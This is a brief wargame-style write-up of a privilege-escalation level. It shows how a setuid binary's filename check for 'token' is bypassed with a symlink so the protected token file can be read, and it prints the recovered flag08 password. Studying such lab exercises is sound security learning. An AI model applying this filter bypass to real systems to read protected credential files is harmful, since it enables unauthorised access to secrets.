we have a binary that tries to open and write the contents of its argument and we have a file "token"
the binary (nm or gdb disas main) compares the argument with string "token" with strstr and exits if it passes
we can open in indirectly with a soft link
ln -s ~/token /tmp/reference
./level08 /tmp/reference
su flag08
quif5eloekouj29ke0vouxean
getflag
